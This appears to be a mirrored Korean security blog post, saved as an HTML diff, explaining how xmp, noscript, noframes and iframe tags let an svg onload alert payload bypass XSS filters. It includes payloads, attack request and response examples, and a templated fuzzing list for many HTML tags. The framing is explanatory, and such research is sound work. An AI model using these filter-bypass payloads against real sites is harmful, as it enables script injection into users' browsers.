@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>Bypass XSS Protection with xmp/noscript/noframes/iframe | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="Bypass XSS Protection with xmp/noscript/noframes/iframe">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/bypass-xss-protection-with-xmp-noscript-etc/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Bypass XSS Protection with xmp/noscript/noframes/iframe">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/bypass-xss-protection-with-xmp-noscript-etc/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Bypass XSS Protection with xmp/noscript/noframes/iframe","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/bypass-xss-protection-with-xmp-noscript-etc/","datePublished":"2019-04-12T00:00:00+00:00","dateModified":"2022-03-04T00:00:00+00:00","image":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og-images/blog-2019-bypass-xss-protection-with-xmp-noscript-etc.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/"},{"@type":"ListItem","position":5,"name":"Bypass XSS Protection with xmp/noscript/noframes/iframe"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">Bypass XSS Protection with xmp/noscript/noframes/iframe</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2019-04-12">
+                        APRIL 12, 2019
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>최근 <a href="https://twitter.com/LooseSecurity/status/1116107113586200581">트위터</a> 에서 이런 XSS 코드가 좀 도는 것 같습니다.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">xmp</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-name">p</span> <span class="hljs-attr">title</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&lt;/xmp&gt;&lt;svg/onload=alert(45)&gt;&quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>조금 된 기법이긴하나 그래도 기존의 XSS 방식을 우회할 수 있는 여지가 큰 방법이라 간간히 이를 이용한 XSS들이 보이는데요. 이런케이스의 공격코드는 어떤것들이 있는지, 어떤 원리로 동작하는지 알아봅시다.</p>
+<h2 id="원리">원리</h2>
+<p>우선 구문만 봐선 p 태그의 title 속성의 값으로 공격코드가 들어가있는 것 처럼 보입니다. 그러나 <code>&lt;xmp&gt;</code> 태그는 내부 문자열을 plain text로 인지하는 태그인데, 웹 브라우저의 파싱 단계에서 “”를 문자열로 처리하는 것 보다, <code>&lt;xmp&gt;</code> 태그 처리가 우선시되어 처리됩니다.</p>
+<p>비슷한 케이스로는.. javascript에서 쿼테이션(<code>&quot;</code>)으로 감싸주어도 <code>&lt;/script&gt;</code> 태그를 이용해 나갈 수 있는 것과 동일합니다. 그림으로 그려보면 이럴 것 같습니다.</p>
+<p><img loading="lazy" src="https://4.bp.blogspot.com/-fRrnQrixxUQ/XLCnh1zFJEI/AAAAAAAAD-k/34zBOhQmJ6M1WOdlvrZ68ftkqheo1EKZQCLcBGAs/s1600/1414.png" alt="" /></p>
+<p>XSS Protection들에선 title부터 속성값으로 보겠지만, 실제 브라우저가 파싱할 땐 xmp로 인해 앞쪽 부분이 무시되고 script 태그가 동작하게 됩니다.</p>
+<p><img loading="lazy" src="https://2.bp.blogspot.com/-C8SRhyT_nZs/XLCoBOepgBI/AAAAAAAAD-0/Rd48w428Zkoc7l5tkKL_S8zgJTqptfPbACLcBGAs/s1600/1413.png" alt="" /></p>
+<h2 id="비슷한-공격코드들">비슷한 공격코드들..</h2>
+<p>noscript</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">noscript</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-name">p</span> <span class="hljs-attr">title</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&lt;/noscript&gt;&lt;svg/onload=alert(45)&gt;&quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>noframes</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">noframes</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-name">p</span> <span class="hljs-attr">title</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&lt;/noframes&gt;&lt;svg/onload=alert(45)&gt;&quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>iframe</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">iframe</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-name">p</span> <span class="hljs-attr">title</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&lt;/iframe&gt;&lt;svg/onload=alert(45)&gt;&quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h2 id="case-study">Case Study</h2>
+<h3 id="dom-paser-기반의-xss-protection-우회">DOM Paser 기반의 XSS Protection 우회</h3>
+<p><strong>Basic Request</strong></p>
+<pre><code>POST /write?id=1 HTTP/1.1
+title=123&amp;content=&lt;script&gt;alert(45)&lt;/script&gt;&lt;img%20src=&quot;&lt;script&gt;alert(45)&lt;/script&gt;&quot;&gt;
+
+</code></pre>
+<p><strong>Basic Response</strong></p>
+<pre><code>&amp;lt;script&amp;gt;alert(45)&amp;lt;/script&amp;gt;&lt;img src=&quot;&lt;script&gt;alert(45)&lt;/script&gt;&quot;&gt;
+</code></pre>
+<p><strong>Attack Request</strong></p>
+<pre><code>POST /write?id=1 HTTP/1.1
+title=123&amp;content=&lt;iframe&gt;&lt;p%20title=&quot;&lt;/iframe&gt;&lt;svg/onload=alert(45)&gt;&quot;&gt;
+
+</code></pre>
+<p><strong>Attack Response</strong></p>
+<pre><code>&lt;iframe&gt;&lt;p title=&quot;&lt;/iframe&gt;&lt;svg/onload=alert(45)&gt;&quot;&gt;
+
+</code></pre>
+<h3 id="noscript-noframes-iframe-xmp-등-태그-내부에-공격코드-삽입이-가능한-경우">noscript , noframes, iframe, xmp 등 태그 내부에 공격코드 삽입이 가능한 경우</h3>
+<p><strong>Basic Request</strong></p>
+<pre><code>GET /search?id=asd&quot;&gt;asdf HTTP/1.1
+</code></pre>
+<p><strong>Basic Response</strong></p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">noscript</span><span class="hljs-punctuation">&gt;</span>&quot;&gt;asdf<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">noscript</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p><strong>Attack Request</strong></p>
+<pre><code>GET /search?id=1&lt;p%20title=&quot;&lt;/noscript&gt;&lt;svg/onload=alert(45)&gt;&quot;&gt; HTTP/1.1
+</code></pre>
+<p><strong>Attack Response</strong></p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">noscript</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-name">p</span> <span class="hljs-attr">title</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&lt;/noscript&gt;&lt;svg/onload=alert(45)&gt;&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">noscript</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h2 id="more-lets-fuzz">More? Let's fuzz</h2>
+<p>모질라에서 정의된 HTML 태그들은 이렇습니다.
+(<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/">https://developer.mozilla.org/en-US/docs/Web/HTML/Element/</a>)</p>
+<pre><code>&lt;a&gt;
+&lt;abbr&gt;
+&lt;acronym&gt;
+&lt;address&gt;
+&lt;applet&gt;
+&lt;area&gt;
+&lt;article&gt;
+&lt;aside&gt;
+&lt;audio&gt;
+&lt;b&gt;
+&lt;base&gt;
+&lt;basefont&gt;
+&lt;bdi&gt;
+&lt;bdo&gt;
+&lt;bgsound&gt;
+&lt;big&gt;
+&lt;blink&gt;
+&lt;blockquote&gt;
+&lt;body&gt;
+&lt;br&gt;
+&lt;button&gt;
+&lt;canvas&gt;
+&lt;caption&gt;
+&lt;center&gt;
+&lt;cite&gt;
+&lt;code&gt;
+&lt;col&gt;
+&lt;colgroup&gt;
+&lt;content&gt;
+&lt;data&gt;
+&lt;datalist&gt;
+&lt;dd&gt;
+&lt;del&gt;
+&lt;details&gt;
+&lt;dfn&gt;
+&lt;dialog&gt;
+&lt;dir&gt;
+&lt;div&gt;
+&lt;dl&gt;
+&lt;dt&gt;
+&lt;em&gt;
+&lt;embed&gt;
+&lt;fieldset&gt;
+&lt;figcaption&gt;
+&lt;figure&gt;
+&lt;font&gt;
+&lt;footer&gt;
+&lt;form&gt;
+&lt;frame&gt;
+&lt;frameset&gt;
+&lt;h1&gt;
+&lt;h2&gt;
+&lt;h3&gt;
+&lt;h4&gt;
+&lt;h5&gt;
+&lt;h6&gt;
+&lt;head&gt;
+&lt;header&gt;
+&lt;hgroup&gt;
+&lt;hr&gt;
+&lt;html&gt;
+&lt;i&gt;
+&lt;iframe&gt;
+&lt;img&gt;
+&lt;input&gt;
+&lt;ins&gt;
+&lt;isindex&gt;
+&lt;kbd&gt;
+&lt;keygen&gt;
+&lt;label&gt;
+&lt;legend&gt;
+&lt;li&gt;
+&lt;link&gt;
+&lt;listing&gt;
+&lt;main&gt;
+&lt;map&gt;
+&lt;mark&gt;
+&lt;marquee&gt;
+&lt;menu&gt;
+&lt;menuitem&gt;
+&lt;meta&gt;
+&lt;meter&gt;
+&lt;nav&gt;
+&lt;nobr&gt;
+&lt;noframes&gt;
+&lt;noscript&gt;
+&lt;object&gt;
+&lt;ol&gt;
+&lt;optgroup&gt;
+&lt;option&gt;
+&lt;output&gt;
+&lt;p&gt;
+&lt;param&gt;
+&lt;picture&gt;
+&lt;plaintext&gt;
+&lt;pre&gt;
+&lt;progress&gt;
+&lt;q&gt;
+&lt;rp&gt;
+&lt;rt&gt;
+&lt;rtc&gt;
+&lt;ruby&gt;
+&lt;s&gt;
+&lt;samp&gt;
+&lt;script&gt;
+&lt;section&gt;
+&lt;select&gt;
+&lt;shadow&gt;
+&lt;slot&gt;
+&lt;small&gt;
+&lt;source&gt;
+&lt;spacer&gt;
+&lt;span&gt;
+&lt;strike&gt;
+&lt;strong&gt;
+&lt;style&gt;
+&lt;sub&gt;
+&lt;summary&gt;
+&lt;sup&gt;
+&lt;table&gt;
+&lt;tbody&gt;
+&lt;td&gt;
+&lt;template&gt;
+&lt;textarea&gt;
+&lt;tfoot&gt;
+&lt;th&gt;
+&lt;thead&gt;
+&lt;time&gt;
+&lt;title&gt;
+&lt;tr&gt;
+&lt;track&gt;
+&lt;tt&gt;
+&lt;u&gt;
+&lt;ul&gt;
+&lt;var&gt;
+&lt;video&gt;
+&lt;wbr&gt;
+&lt;xmp&gt;
+
+</code></pre>
+<p>테스트를 위해 Template 화하고…</p>
+<pre><code class="language-ruby hljs"><span class="hljs-operator">&lt;</span>a<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>abbr<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>acronym<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>address<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>applet<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>area<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>article<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>aside<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>audio<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>b<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>base<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>basefont<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>bdi<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>bdo<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>bgsound<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>big<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>blink<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>blockquote<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>body<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>br<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>button<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>canvas<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>caption<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>center<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>cite<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
